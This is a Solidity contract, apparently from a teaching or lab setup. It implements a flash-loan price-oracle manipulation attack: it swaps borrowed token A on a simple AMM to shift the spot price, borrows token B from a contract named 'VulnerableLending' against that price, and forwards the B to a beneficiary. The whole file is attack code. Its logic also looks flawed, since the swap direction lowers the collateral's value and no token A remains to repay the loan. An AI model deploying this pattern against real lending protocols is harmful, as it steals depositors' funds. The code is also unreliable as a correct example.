// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ISimpleAMM {
    function swapAForB(uint256 amountIn) external returns (uint256 amountOut);
    function swapBForA(uint256 amountIn) external returns (uint256 amountOut);
    function getSpotPrice() external view returns (uint256); // B per A scaled by 1e18
}

interface IVulnerableLending {
    function depositCollateral(uint256 amount) external;
    function borrow(uint256 amountB) external;
    function collateralA(address who) external view returns (uint256);
}

contract AttackerFlash {
    IERC20 public tokenA;
    IERC20 public tokenB;
    ISimpleAMM public amm;
    IVulnerableLending public lending;
    address public owner;
    address public beneficiary; // who receives profit

    uint256 public constant LTV_BP = 5000;
    uint256 public constant BP = 10000;

    constructor(address _tokenA, address _tokenB, address _amm, address _lending, address _beneficiary) {
        tokenA = IERC20(_tokenA);
        tokenB = IERC20(_tokenB);
        amm = ISimpleAMM(_amm);
        lending = IVulnerableLending(_lending);
        owner = msg.sender;
        beneficiary = _beneficiary;
    }

    // Called by FlashLoanProvider after it transfers TokenA to this contract.
    function executeOperation(uint256 amount, bytes calldata /* params */) external {
        // 1) Move price: swap A -> B
        tokenA.approve(address(amm), amount);
        amm.swapAForB(amount);

        // 2) Compute allowed borrow and borrow a safe amount
        uint256 collA = lending.collateralA(address(this));
        require(collA > 0, "no collateral for attacker contract");

        uint256 spot = amm.getSpotPrice(); // B per A scaled by 1e18
        uint256 collValueB = (collA * spot) / 1e18;
        uint256 allowed = (collValueB * LTV_BP) / BP;

        // apply safety margin ~0.2%
        uint256 safeAllowed = (allowed * 998) / 1000;
        require(safeAllowed > 0, "allowed zero after margin");

        lending.borrow(safeAllowed);

        // 3) Forward profit (all TokenB) to beneficiary
        uint256 profitB = tokenB.balanceOf(address(this));
        if (profitB > 0) {
            tokenB.transfer(beneficiary, profitB);
        }

        // 4) Repay flash loan (amount + fee). FlashLoanProvider uses feeBP = 5 (0.05%)
        uint256 feeBP = 5;
        uint256 owed = amount + (amount * feeBP) / 10000;
        tokenA.transfer(msg.sender, owed);
    }

    // helper: owner deposits collateral for this contract
    function depositMyCollateral(uint256 amount) external {
        require(msg.sender == owner, "only owner");
        tokenA.approve(address(lending), amount);
        lending.depositCollateral(amount);
    }
}

